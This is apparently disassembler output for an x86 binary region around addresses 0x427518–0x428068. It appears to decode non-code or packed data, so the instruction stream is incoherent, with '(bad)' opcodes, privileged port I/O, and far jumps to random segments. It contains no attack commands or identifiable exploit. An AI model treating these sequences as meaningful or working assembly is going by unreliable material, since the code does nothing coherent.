  427518:	pop    esp
  427519:	cmp    esi,DWORD PTR [esp+esi*8]
  42751c:	xchg   DWORD PTR [ecx+ebx*4],ebp
  42751f:	cwde   
  427520:	push   esi
  427521:	repz sbb ch,BYTE PTR [ebx*4+0x38ca64f6]
  427529:	xchg   esp,eax
  42752a:	in     al,dx
  42752b:	push   eax
  42752c:	and    BYTE PTR ds:0xd10e15da,bh
  427532:	pop    eax
  427533:	xchg   eax,esp
  427535:	add    BYTE PTR [ebp-0x12],ah
  427538:	popa   
  427539:	loop   0x4275b1
  42753b:	int3   
  42753c:	or     eax,0xd21abaa2
  427541:	inc    esi
	...
  4275b2:	add    BYTE PTR [eax],al
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0xc79a8b87,al
  4275c1:	cmp    eax,0xa2da78a2
  4275c6:	add    DWORD PTR [eax],eax
  4275c8:	test   BYTE PTR [eax],0x0
  4275cb:	add    BYTE PTR [ecx-0x5c],ch
  4275ce:	in     al,dx
  4275cf:	jo     0x4275d1
  4275d1:	cmp    ax,0xe2de
  4275d5:	xchg   BYTE PTR [ecx+0x6b8fe3e5],ch
  4275db:	je     0x427598
  4275dd:	sbb    ecx,edi
  4275df:	lock mov edx,0x80be042b
  4275e5:	fisub  DWORD PTR [edx-0x3b]
  4275e8:	adc    BYTE PTR [edi+eax*1-0x137a9d86],0x1
  4275f0:	stos   BYTE PTR es:[edi],al
  4275f1:	loopne 0x4275cf
  4275f3:	mov    dl,BYTE PTR ds:0x65a34b2c
  4275f9:	xchg   esi,eax
  4275fa:	jecxz  0x42761c
  4275fc:	pop    ss
  4275fd:	test   eax,0xd3887da4
  427602:	data16 mov dh,0x96
  427605:	cmp    DWORD PTR [ebx-0x37],0x2c
  427609:	mov    al,ds:0xca3576a
  42760e:	call   0x8d3c:0x8920ec51
  427615:	push   0xd67d80e5
  42761a:	popf   
  42761b:	sbb    bh,BYTE PTR [eax+0x22]
  42761e:	push   cs
  42761f:	fs cs out 0x36,eax
  427623:	pop    ebx
  427624:	repz sub edx,esp
  427627:	and    DWORD PTR [edx-0x56],ebp
  42762a:	hlt    
  42762b:	mov    eax,0xc8669622
  427630:	sbb    BYTE PTR [ecx-0x70],ah
  427633:	mov    esp,DWORD PTR [edi]
  427635:	sub    di,WORD PTR [eax]
  427638:	or     BYTE PTR [ebx-0x61],0x53
  42763c:	adc    eax,0x508bd45e
  427641:	pusha  
  427642:	inc    ecx
  427643:	daa    
  427644:	sbb    al,0x0
  427646:	lock xchg edi,eax
  427648:	lea    edi,[ecx+0x3ad267ed]
  42764e:	fs cli 
  427650:	pop    edx
  427651:	arpl   WORD PTR [edi+0x29bfe21b],si
  427657:	inc    esi
  427658:	inc    eax
  427659:	add    edx,DWORD PTR [ebp-0x30]
  42765c:	mov    cl,0x23
  42765e:	sub    bh,BYTE PTR [eax-0x12]
  427661:	(bad)
  427664:	icebp  
  427665:	or     bh,BYTE PTR [eax+ebx*4+0x9ffcb51]
  42766c:	add    bl,BYTE PTR [eax+0x3f]
  42766f:	int3   
  427670:	push   cs
  427671:	mov    ah,bh
  427673:	popa   
  427674:	mov    BYTE PTR [ecx],ch
  427676:	in     eax,0xb4
  427678:	ficomp DWORD PTR [ecx]
  42767a:	inc    edi
  42767b:	push   ebx
  42767c:	adc    ebx,esi
  42767e:	ror    DWORD PTR [ebx-0xd],1
  427681:	dec    edi
  427682:	test   al,dl
  427684:	mov    ds:0x20fb42c,eax
  427689:	dec    eax
  42768a:	daa    
  42768b:	mov    gs,ebx
  42768d:	mov    cl,0x6b
  42768f:	sbb    al,0xb6
  427691:	mov    dh,0xf2
  427693:	imul   ebp,DWORD PTR [edx],0xab6407fb
  427699:	sbb    BYTE PTR [esi],bl
  42769b:	int3   
  42769c:	ja     0x4276d5
  42769e:	dec    DWORD PTR [edx-0x30]
  4276a1:	in     eax,dx
  4276a2:	sbb    al,0x3
  4276a4:	or     eax,DWORD PTR [ebx+0x11811fc6]
  4276aa:	xor    dl,bl
  4276ac:	push   0x12
  4276ae:	test   ch,0x35
  4276b1:	xor    dl,ah
  4276b3:	or     BYTE PTR [ebp+0x28d9bc4b],0xf1
  4276ba:	mov    al,ds:0xc5da8ecf
  4276bf:	out    0xe8,eax
  4276c1:	popa   
	...
  427732:	add    BYTE PTR [eax],al
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	inc    ecx
  427741:	addr16 pop ecx
  427743:	sbb    al,0xd0
  427745:	mov    ds:0xf60001,eax
  42774a:	add    BYTE PTR [eax],al
  42774c:	fdivrp st(6),st
  42774e:	push   ds
  42774f:	daa    
  427750:	fdivr  st(2),st
  427752:	jmp    0x42777f
  427754:	pop    edx
  427755:	icebp  
  427756:	pop    ebx
  427757:	adc    esi,DWORD PTR [ecx]
  427759:	dec    eax
  42775a:	mov    dl,0x27
  42775c:	sbb    ebx,edi
  42775e:	pop    edi
  42775f:	aas    
  427760:	inc    esi
  427761:	mov    al,BYTE PTR [esi]
  427763:	cli    
  427764:	sbb    esi,DWORD PTR [ecx]
  427766:	add    DWORD PTR [edi+0x19],ebx
  427769:	lea    esi,[edx-0x30]
  42776c:	aam    0x4d
  42776e:	retf   
  42776f:	or     DWORD PTR [esi+edi*8],0xfe8b6ef4
  427776:	xor    al,0x13
  427778:	cmp    BYTE PTR [esi+0x10],bh
  42777b:	test   al,0x7a
  42777e:	add    edx,DWORD PTR [eax]
  427780:	or     bh,BYTE PTR [edx+esi*4+0x2340a9f5]
  427787:	push   cs
  427788:	out    dx,eax
  427789:	xor    eax,0xbc97013d
  42778e:	fs ret 
  427790:	(bad)  [ecx-0x3630916a]
  427796:	int3   
  427797:	dec    ebp
  427798:	pop    eax
  427799:	out    0x4f,eax
  42779b:	ror    DWORD PTR [esi],0x79
  42779e:	or     esi,0x64f53055
  4277a4:	fninit 
  4277a6:	imul   esp,DWORD PTR [ecx+edx*8-0xea831df],0x3e
  4277ae:	jae    0x4277b9
  4277b0:	inc    esi
  4277b1:	jo     0x427827
  4277b3:	mov    ch,0xe7
  4277b5:	lods   eax,DWORD PTR ds:[esi]
  4277b6:	js     0x4277ca
  4277b8:	jae    0x427819
  4277ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277bb:	in     eax,0x85
  4277bd:	and    DWORD PTR [edx-0x7e],0x2c
  4277c1:	jbe    0x4277ac
  4277c3:	fstp   TBYTE PTR [edx-0x48]
  4277c6:	pop    edi
  4277c7:	mov    dl,0x6
  4277c9:	loop   0x4277a9
  4277cb:	ret    
  4277cc:	pusha  
  4277cd:	iret   
  4277ce:	pop    esp
  4277cf:	fidivr WORD PTR [edi+eiz*8]
  4277d2:	cmc    
  4277d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277d4:	xlat   BYTE PTR ds:[ebx]
  4277d5:	sub    BYTE PTR [eax+0x21],0x94
  4277d9:	fcomp  DWORD PTR [edi+edi*8]
  4277dc:	or     eax,0xa1fa1b38
  4277e1:	ds cmp ah,al
  4277e4:	mov    esi,DWORD PTR [ebx]
  4277e6:	call   0xadbf8183
  4277eb:	push   ss
  4277ec:	std    
  4277ed:	imul   eax,DWORD PTR [ebx+0x14],0xffffffad
  4277f1:	jg     0x4277b3
  4277f3:	lea    ebp,[edi]
  4277f5:	dec    ebp
  4277f6:	hlt    
  4277f7:	push   edx
  4277f8:	(bad)  
  4277f9:	ja     0x4277d0
  4277fb:	dec    edi
  4277fc:	sbb    BYTE PTR [esi],bh
  4277fe:	and    bh,BYTE PTR [ebp-0x23e3d890]
  427804:	les    esi,FWORD PTR [eax]
  427806:	imul   esp,DWORD PTR [eax-0x22],0x82e2b315
  42780d:	cli    
  42780e:	arpl   WORD PTR [edi],si
  427810:	inc    edx
  427811:	ja     0x4277d8
  427813:	ins    DWORD PTR es:[edi],dx
  427814:	or     eax,0x3f37b9c6
  427819:	lods   al,BYTE PTR ds:[esi]
  42781a:	mov    esp,0xc05c6cef
  42781f:	add    BYTE PTR [ebx],al
  427821:	repnz xor esp,ebp
  427824:	cli    
  427825:	adc    DWORD PTR [ebx-0x12],0x41214a76
  42782c:	mov    bh,0x39
  42782e:	jle    0x427875
  427830:	std    
  427831:	lds    esp,FWORD PTR [esi+eiz*8-0x483a81ee]
  427838:	aas    
  427839:	sub    al,0x78
  42783b:	and    dl,dl
  42783d:	adc    DWORD PTR [eax],edi
  42783f:	lock enter 0x13,0x0
	...
  4278b4:	mov    WORD PTR [esi+0x7d],cs
  4278b7:	jge    0x4278b8
  4278b9:	jg     0x427847
  4278bb:	dec    DWORD PTR [eax-0x5e]
  4278be:	(bad)  
  4278bf:	xchg   ecx,eax
  4278c0:	jmp    0x1a4:0xc68a660a
  4278c7:	add    dh,dh
  4278c9:	add    BYTE PTR [eax],al
  4278cb:	add    BYTE PTR [esi],dh
  4278cd:	adc    dh,dh
  4278cf:	add    ecx,edi
  4278d1:	mov    cl,0xb1
  4278d3:	mov    edx,0x3327dc09
  4278d8:	retf   
  4278d9:	push   ss
  4278da:	inc    esp
  4278db:	mov    cl,0xda
  4278dd:	ds push 0x74518cda
  4278e3:	add    ch,BYTE PTR [ebp+0x7]
  4278e6:	lods   al,BYTE PTR ds:[esi]
  4278e7:	movntps XMMWORD PTR [edi-0x7a],xmm4
  4278eb:	icebp  
  4278ec:	repnz cdq 
  4278ee:	push   ds
  4278ef:	cdq    
  4278f0:	dec    esi
  4278f1:	push   ebx
  4278f2:	sub    eax,DWORD PTR [eax-0x19]
  4278f5:	popa   
  4278f6:	je     0x427955
  4278f8:	pop    es
  4278f9:	fs int3 
  4278fb:	sub    ah,BYTE PTR [eax+0x18]
  4278fe:	pop    ecx
  4278ff:	ret    0xfc79
  427902:	xchg   ecx,eax
  427903:	xlat   BYTE PTR ds:[ebx]
  427904:	rcl    DWORD PTR [ecx],0x40
  427907:	push   ds
  427908:	clc    
  427909:	mov    BYTE PTR [ecx+0xa261988],cl
  42790f:	jnp    0x427973
  427911:	dec    ebx
  427912:	div    BYTE PTR [edi+0x5b1eb9a1]
  427918:	xchg   DWORD PTR [ecx-0x64],ebp
  42791b:	rol    BYTE PTR [ebp+0x42],0x5
  42791f:	fwait
  427920:	sub    cl,BYTE PTR [ebp+0x7b]
  427923:	ja     0x427959
  427925:	jmp    0xfbc55964
  42792a:	push   0x1d
  42792c:	and    BYTE PTR [edx-0x6db0995c],0x0
  427933:	(bad)  
  427934:	ror    DWORD PTR [ebx],0x7a
  427937:	loopne 0x4279b7
  427939:	cmp    ebx,ebx
  42793b:	mov    esp,0xdeefc888
  427940:	or     esp,DWORD PTR [eax+eiz*2]
  427943:	ins    DWORD PTR es:[edi],dx
  427944:	int    0xb0
  427946:	sbb    edx,DWORD PTR [esp+ecx*8]
  427949:	xor    ecx,DWORD PTR [edi-0x7146322d]
  42794f:	dec    esp
  427950:	inc    esi
  427951:	icebp  
  427952:	dec    esp
  427953:	mov    esp,ecx
  427955:	ja     0x427900
  427957:	pop    esp
  427958:	popf   
  427959:	jmp    0x48055a55
  42795e:	cwde   
  42795f:	(bad)  
  427960:	leave  
  427961:	rcr    bl,cl
  427963:	pop    ecx
  427964:	mov    eax,ds:0x7492e2ec
  427969:	sbb    al,0x5f
  42796b:	sub    DWORD PTR [edi],0x62340e43
  427971:	mov    ch,0xd8
  427973:	push   edi
  427974:	mov    ds:0x80964602,al
  427979:	mov    bl,0xe4
  42797b:	xor    BYTE PTR [esi],bh
  42797d:	out    0xc8,eax
  42797f:	add    BYTE PTR [ebp+0x65],bh
  427982:	or     BYTE PTR [ebx+0x3397c9d5],bh
  427988:	mov    ss,WORD PTR [ebp-0x5f26f601]
  42798e:	ins    BYTE PTR es:[edi],dx
  42798f:	pop    ss
  427990:	dec    ecx
  427991:	pop    ebp
  427992:	aad    0x66
  427994:	out    dx,al
  427995:	std    
  427996:	dec    edx
  427997:	dec    esp
  427998:	mov    ds:0xde633d2f,al
  42799d:	ins    DWORD PTR es:[edi],dx
  42799e:	jbe    0x427984
  4279a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279a1:	arpl   WORD PTR ds:[ebp+0x2d],ax
  4279a5:	or     DWORD PTR [ebp-0x4a],ebp
  4279a8:	mov    edx,0xa49e1933
  4279ad:	mov    bl,0x9d
  4279af:	or     BYTE PTR [ebx+0x5f],0xd8
  4279b3:	ins    BYTE PTR es:[edi],dx
  4279b4:	add    eax,0x105abd85
  4279b9:	loop   0x42798b
  4279bb:	adc    ecx,ebx
  4279bd:	ret    0xda21
  4279c0:	cli    
  4279c1:	adc    al,0x0
	...
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x8c
  427a41:	pop    ds
  427a42:	int    0x6d
  427a44:	mov    esp,0xf60001a5
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [esi-0x52],bl
  427a4e:	mov    DWORD PTR [eax],ebp
  427a50:	jnp    0x427a2e
  427a52:	cli    
  427a53:	in     eax,dx
  427a54:	push   edi
  427a55:	and    ch,BYTE PTR [edx-0x553bc1e]
  427a5b:	mov    ebx,0x5824333e
  427a60:	ds xchg ecx,eax
  427a62:	test   DWORD PTR [esi-0x2e],esp
  427a65:	cmc    
  427a66:	rol    BYTE PTR [eax],0x6c
  427a69:	data16 jno 0x427a81
  427a6c:	add    al,0x86
  427a6e:	in     al,0x74
  427a70:	mov    dh,BYTE PTR [edi+ecx*8]
  427a73:	sbb    al,0x75
  427a75:	xlat   BYTE PTR ds:[ebx]
  427a76:	lea    eax,[edi+0x52e0dcb5]
  427a7c:	fisub  WORD PTR ds:0x400af1b2
  427a82:	adc    eax,0xa698cb3c
  427a87:	lods   eax,DWORD PTR ds:[esi]
  427a88:	in     al,0x7
  427a8a:	add    dh,ah
  427a8c:	jns    0x427a9e
  427a8e:	aaa    
  427a8f:	iret   
  427a90:	mov    ah,0xc6
  427a92:	fist   DWORD PTR [ecx]
  427a94:	sbb    BYTE PTR [edi],0x50
  427a97:	(bad)  
  427a98:	xchg   esp,eax
  427a99:	jle    0x427a77
  427a9b:	xor    DWORD PTR [ebp-0xd],esp
  427a9e:	lock inc ebx
  427aa0:	ja     0x427a75
  427aa2:	xor    DWORD PTR [edx+0x72e8c485],0x46a53337
  427aac:	lods   al,BYTE PTR ds:[esi]
  427aad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aae:	dec    ebp
  427aaf:	and    DWORD PTR [eax],ebp
  427ab1:	jp     0x427a3c
  427ab3:	test   al,0x4
  427ab5:	pusha  
  427ab6:	in     al,dx
  427ab7:	and    BYTE PTR [eax-0x284fc47e],0x5
  427abe:	adc    dl,BYTE PTR [ebp+0xbd14cd5]
  427ac4:	into   
  427ac5:	adc    dl,BYTE PTR [esp+ebp*1-0x2681f9b7]
  427acc:	mov    WORD PTR [ebx+0x12],ss
  427acf:	mov    dl,0x68
  427ad1:	xchg   ecx,eax
  427ad2:	mov    WORD PTR [edx+ebx*2],cs
  427ad5:	cli    
  427ad6:	jnp    0x427af6
  427ad8:	gs mov eax,0x89a18ff3
  427ade:	mov    bh,0xcd
  427ae0:	lods   al,BYTE PTR ds:[esi]
  427ae1:	sbb    bl,cl
  427ae3:	in     eax,dx
  427ae4:	cmp    esi,edi
  427ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ae7:	aad    0x1f
  427ae9:	imul   edi,DWORD PTR [ecx+0x5c],0xffffffc8
  427aed:	add    ah,al
  427aef:	jge    0x427ab7
  427af1:	xchg   ecx,eax
  427af2:	or     ah,BYTE PTR [ebx-0x4e5b71ee]
  427af8:	dec    ebx
  427af9:	fmul   DWORD PTR [ecx-0x595e5e37]
  427aff:	hlt    
  427b00:	cmp    al,0x77
  427b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b03:	push   ds
  427b04:	or     ecx,DWORD PTR [ebp+0xc52f558]
  427b0a:	mov    eax,0x5e940d90
  427b0f:	jno    0x427ad9
  427b11:	in     eax,0xb3
  427b13:	int3   
  427b14:	test   eax,0x2e185f8c
  427b19:	sbb    al,0xf9
  427b1b:	data16 stos BYTE PTR es:[edi],al
  427b1d:	push   ss
  427b1e:	sub    eax,0xe71ac650
  427b23:	stc    
  427b24:	sbb    al,0xf5
  427b26:	cmp    DWORD PTR [esi-0x2],edx
  427b29:	sahf   
  427b2a:	sub    BYTE PTR [esi+0x51],dl
  427b2d:	out    dx,al
  427b2e:	repz add BYTE PTR cs:[esi-0x33a2daf1],bl
  427b36:	aad    0x8f
  427b38:	xor    DWORD PTR [eax+0x5e],ebx
  427b3b:	rcl    esp,cl
  427b3d:	mov    dl,0xa3
  427b3f:	jae    0x427b5a
  427b41:	dec    esp
	...
  427bb2:	add    BYTE PTR [eax],al
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0x5414fe65
  427bc1:	dec    ecx
  427bc2:	or     eax,0x1a6b2ca
  427bc7:	add    dh,dh
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [ebx+0x5514a7ea],dl
  427bd1:	rcr    DWORD PTR [ebx],cl
  427bd3:	(bad)  
  427bd4:	sbb    eax,0xea493c1c
  427bd9:	rcr    dh,1
  427bdb:	test   bh,al
  427bdd:	add    al,ch
  427bdf:	cmp    bl,BYTE PTR [ebx+0x7382d4a1]
  427be5:	call   0x999dbbe0
  427bea:	and    eax,0xa592cb6d
  427bef:	lods   al,BYTE PTR ds:[esi]
  427bf0:	mov    ds:0x1588305d,eax
  427bf5:	xchg   ebp,eax
  427bf6:	mov    ebp,0x3866e8a7
  427bfb:	arpl   WORD PTR [ecx-0x115e6c72],dx
  427c01:	leave  
  427c02:	in     eax,dx
  427c03:	and    DWORD PTR [eax+eax*8-0x14],ebp
  427c07:	sub    BYTE PTR [ecx-0x35],0xda
  427c0b:	xchg   ebx,eax
  427c0c:	(bad)  
  427c0d:	xor    bl,BYTE PTR [edi+esi*4]
  427c10:	aas    
  427c11:	and    eax,0x4090d77f
  427c16:	add    ebx,esi
  427c18:	add    ebp,DWORD PTR [edx]
  427c1a:	fidiv  WORD PTR [ecx+0x3c]
  427c1d:	arpl   WORD PTR [edx+0x21],sp
  427c20:	ins    DWORD PTR es:[edi],dx
  427c21:	xchg   cl,al
  427c23:	mov    WORD PTR [ecx-0x48],?
  427c26:	ins    DWORD PTR es:[edi],dx
  427c27:	fadd   DWORD PTR [edi+0x6d016f17]
  427c2d:	lds    esp,FWORD PTR [esp+ebp*2+0xeb23988]
  427c34:	mov    esp,0xeef99b31
  427c39:	cmp    al,BYTE PTR [ebx-0x7c701c6a]
  427c3f:	add    dl,BYTE PTR [ecx]
  427c41:	mov    eax,ds:0xf32e378
  427c46:	dec    edi
  427c47:	aad    0x90
  427c49:	jle    0x427be8
  427c4b:	sbb    eax,DWORD PTR [eax]
  427c4d:	or     al,BYTE PTR [ecx]
  427c4f:	xor    DWORD PTR [edx],0x61524924
  427c55:	or     eax,0xb0956f04
  427c5a:	xchg   esp,eax
  427c5b:	jle    0x427c3a
  427c5d:	mov    esi,0xda69a37e
  427c62:	pop    es
  427c63:	sbb    BYTE PTR [esi],0x92
  427c66:	adc    al,0xee
  427c68:	dec    ebx
  427c69:	mov    esi,0xb115ce7b
  427c6e:	aaa    
  427c6f:	int    0x35
  427c71:	ja     0x427c90
  427c73:	sub    al,0xd0
  427c75:	pusha  
  427c76:	xchg   ebx,eax
  427c77:	mov    DWORD PTR [esi+0x6fb0d81d],esp
  427c7d:	or     DWORD PTR [ecx+0x59b36d84],ebp
  427c83:	fdiv   st,st(7)
  427c85:	push   0xffffffa6
  427c87:	fdiv   QWORD PTR [edx]
  427c89:	fiadd  DWORD PTR [eax]
  427c8b:	or     ebp,DWORD PTR [edi-0x2313cbeb]
  427c91:	sbb    ch,BYTE PTR [ebp+0x72]
  427c94:	nop
  427c95:	add    edi,DWORD PTR [ebx+0x6c0b8cfa]
  427c9b:	xlat   BYTE PTR ds:[bx]
  427c9d:	mov    BYTE PTR [edi-0x5c69233c],dl
  427ca3:	rcl    BYTE PTR [ebx-0x43],1
  427ca6:	or     al,BYTE PTR [ecx+ecx*2-0x76]
  427caa:	inc    eax
  427cab:	loope  0x427cdf
  427cad:	xor    BYTE PTR [edi+ebx*8-0x18],dh
  427cb1:	mov    dh,0x11
  427cb3:	pushf  
  427cb4:	(bad)  
  427cb5:	outs   dx,BYTE PTR ds:[esi]
  427cb6:	mov    cl,0x1e
  427cb8:	jno    0x427cca
  427cba:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  427cbc:	mov    ecx,0xe1bf659c
  427cc1:	xchg   ebx,eax
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0x4aa1:0xdc63ecf9
  427d41:	test   al,0xd0
  427d43:	loop   0x427ced
  427d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d46:	add    DWORD PTR [eax],eax
  427d48:	test   BYTE PTR [eax],0x0
  427d4b:	add    BYTE PTR [edx+0x6a865613],al
  427d51:	sbb    dh,0xdb
  427d54:	mov    ah,0x1c
  427d56:	int    0x20
  427d58:	int3   
  427d59:	mov    al,0x5f
  427d5b:	mov    ds:0x36be10a,eax
  427d60:	js     0x427d64
  427d62:	aas    
  427d63:	mov    esp,0x41bfde19
  427d68:	mov    esp,0xcf79e0b1
  427d6d:	xchg   ebp,eax
  427d6e:	or     cl,BYTE PTR [eiz*2+0x49032be0]
  427d75:	arpl   WORD PTR [esi],bx
  427d77:	mov    DWORD PTR [esi],ecx
  427d79:	ins    BYTE PTR es:[edi],dx
  427d7a:	test   al,0xc3
  427d7c:	cmp    eax,0xe457550
  427d81:	mov    edx,0xc6a8c1ca
  427d86:	outs   dx,BYTE PTR ds:[esi]
  427d87:	lea    esp,[eax]
  427d89:	cs clc 
  427d8b:	sar    BYTE PTR [ebx],cl
  427d8d:	inc    eax
  427d8e:	mov    DWORD PTR [esi+edx*1],edi
  427d91:	stc    
  427d92:	sti    
  427d93:	out    0x98,eax
  427d95:	sub    bh,BYTE PTR [ebx-0x2e]
  427d98:	call   0xc70c:0xb62bcd5d
  427d9f:	jle    0x427d57
  427da1:	stos   DWORD PTR es:[edi],eax
  427da2:	add    eax,0xd6e5c644
  427da7:	(bad)  
  427da8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427da9:	mov    cl,0x35
  427dab:	pop    ebx
  427dac:	jmp    0xaac3:0xb8930715
  427db3:	int    0x33
  427db5:	xor    DWORD PTR [ebp+0x70],0x40
  427db9:	ror    BYTE PTR [ebx-0x19371b52],1
  427dbf:	das    
  427dc0:	repz pop edi
  427dc2:	pop    es
  427dc3:	jno    0x427d58
  427dc5:	scas   eax,DWORD PTR es:[edi]
  427dc6:	sbb    BYTE PTR [edi+0x41c3dbf2],al
  427dcc:	add    ah,BYTE PTR [edi]
  427dce:	xchg   esp,eax
  427dcf:	aas    
  427dd0:	test   eax,0x1bf880fe
  427dd5:	int    0xd7
  427dd7:	test   al,0xd8
  427dd9:	and    dh,dh
  427ddb:	xchg   ebp,eax
  427ddc:	lock or eax,0x2bb5135a
  427de2:	sbb    eax,0x4cc97fdf
  427de7:	sub    DWORD PTR [edi+0x52],ecx
  427dea:	aam    0x5
  427dec:	fsub   st,st(0)
  427dee:	hlt    
  427def:	call   0x852043c4
  427df4:	sub    bl,BYTE PTR [ebx-0x54]
  427df7:	scas   eax,DWORD PTR es:[edi]
  427df8:	neg    DWORD PTR [eax+0x27]
  427dfb:	pop    eax
  427dfc:	jnp    0x427e4e
  427dfe:	sub    BYTE PTR [edx],0xfc
  427e01:	ds js  0x427db0
  427e04:	rcl    BYTE PTR [edx-0x4cd372a],1
  427e0a:	test   BYTE PTR [edi-0x2158d1b1],cl
  427e10:	(bad)  
  427e11:	mov    ah,0x59
  427e13:	in     al,dx
  427e14:	adc    cl,BYTE PTR [edx+edx*4-0x70862b97]
  427e1b:	repnz xchg ebp,eax
  427e1d:	(bad)  
  427e1e:	lods   eax,DWORD PTR ds:[esi]
  427e1f:	mov    eax,0xb879355d
  427e24:	inc    esi
  427e25:	test   BYTE PTR ds:0xf3050ef,0x8d
  427e2c:	adc    edx,DWORD PTR [esi]
  427e2e:	and    DWORD PTR [esi+0x5e422267],edi
  427e34:	xor    eax,0x2c3aae18
  427e39:	ret    0x4bf8
  427e3c:	sub    BYTE PTR [eax],ch
  427e3e:	inc    edx
  427e3f:	push   ebp
  427e40:	dec    edi
  427e41:	pop    ebp
	...
  427eb2:	add    BYTE PTR [eax],al
  427eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427eb5:	mov    ds:0xf5c7f1c7,al
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	push   eax
  427ec1:	xchg   BYTE PTR [ecx-0x21],al
  427ec4:	sahf   
  427ec5:	test   al,0x1
  427ec7:	add    dh,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [ecx+0x2d86499d],al
  427ed1:	neg    DWORD PTR [edx-0x764cfd0d]
  427ed7:	sbb    BYTE PTR ds:0x2d28c3e7,al
  427edd:	call   0xddb:0xa620585e
  427ee4:	dec    ebp
  427ee5:	cld    
  427ee6:	ret    
  427ee7:	fs mov ebp,esp
  427eea:	fistp  QWORD PTR [eax*4+0x4031c3f1]
  427ef1:	cmp    ecx,DWORD PTR [bx+si-0x27]
  427ef5:	cmp    eax,edi
  427ef7:	push   ecx
  427ef8:	jno    0x427f72
  427efa:	or     eax,0x6ef5c57e
  427eff:	mov    edx,0xc4f02902
  427f04:	or     eax,0xfb98e666
  427f09:	jae    0x427ed2
  427f0b:	mov    bh,0x7e
  427f0d:	adc    al,0x5f
  427f0f:	fadd   DWORD PTR [ecx+0x1d]
  427f12:	fnstsw WORD PTR [edi-0xd]
  427f15:	jmp    0x427f24
  427f17:	mov    dh,0x4e
  427f19:	mov    ebp,0xa91d632a
  427f1e:	sbb    ah,BYTE PTR [edi]
  427f20:	xchg   ecx,eax
  427f21:	(bad)
  427f25:	dec    ebx
  427f26:	mov    ebx,0x440cd3f5
  427f2b:	sub    ebp,DWORD PTR [edx]
  427f2d:	retf   
  427f2e:	push   edx
  427f2f:	jnp    0x427f4f
  427f31:	inc    esp
  427f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f33:	pop    ds
  427f34:	test   al,0x14
  427f36:	lods   eax,DWORD PTR ds:[esi]
  427f37:	(bad)  
  427f38:	outs   dx,DWORD PTR ds:[esi]
  427f39:	inc    eax
  427f3a:	xor    DWORD PTR [edi-0x5e6f2ab7],0xffffffc8
  427f41:	imul   ebp,DWORD PTR [edx],0xbf10e1cc
  427f47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f48:	mov    edx,?
  427f4a:	rcl    DWORD PTR [ebp-0x1ceedb07],1
  427f50:	jg     0x427f09
  427f52:	jecxz  0x427f5e
  427f54:	in     eax,0x61
  427f56:	or     DWORD PTR [ebp+0x6],ebp
  427f59:	xlat   BYTE PTR ds:[ebx]
  427f5a:	ror    BYTE PTR [ebp+0x57416ce9],0x89
  427f61:	push   ebp
  427f62:	push   edi
  427f63:	inc    esp
  427f64:	sub    BYTE PTR [ebx+edx*8],ah
  427f67:	jl     0x427f68
  427f69:	mov    edi,0xdf6bb8e7
  427f6e:	out    dx,al
  427f6f:	jmp    0x1039:0xf7a45bf7
  427f76:	sub    esi,esi
  427f78:	imul   esi,eax,0x22
  427f7b:	stos   DWORD PTR es:[edi],eax
  427f7c:	adc    al,0x30
  427f7e:	jecxz  0x427fc4
  427f80:	mov    bh,0x9f
  427f82:	fadd   QWORD PTR [edx+0x5a]
  427f85:	inc    eax
  427f86:	add    al,BYTE PTR [ebp+0x39a026f0]
  427f8c:	in     eax,0xf
  427f8e:	ret    0x3ff
  427f91:	xchg   BYTE PTR [edi],bh
  427f93:	int    0x16
  427f95:	call   0x31d9:0x4f92adf
  427f9c:	inc    eax
  427f9d:	pop    esp
  427f9e:	jbe    0x427f49
  427fa0:	mov    al,ds:0xed15fcf9
  427fa5:	fcom   DWORD PTR [ecx-0x64db352c]
  427fac:	ret    0x5f49
  427faf:	scas   eax,DWORD PTR es:[edi]
  427fb0:	mov    dl,0xe1
  427fb2:	leave  
  427fb3:	dec    esi
  427fb4:	sti    
  427fb5:	call   0xbbd4c578
  427fba:	cli    
  427fbb:	lahf   
  427fbc:	es icebp 
  427fbe:	mov    ch,0xe3
  427fc0:	lea    ecx,[ecx+0x0]
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   ebx,ebx
  428041:	dec    ebp
  428042:	pop    es
  428043:	xchg   ecx,eax
  428044:	xchg   esp,eax
  428045:	test   eax,0xf60001
  42804a:	add    BYTE PTR [eax],al
  42804c:	mov    edi,0xa60d44c5
  428051:	cli    
  428052:	ret    0x714
  428055:	icebp  
  428056:	and    DWORD PTR [ebx+0x3d724716],esi
  42805c:	fidivr DWORD PTR [edi-0x645e291d]
  428062:	dec    esp
  428063:	xchg   ecx,eax
  428064:	pop    ds
  428065:	add    DWORD PTR [ebx+edi*1],ebx
  428068:	xchg   edi,eax
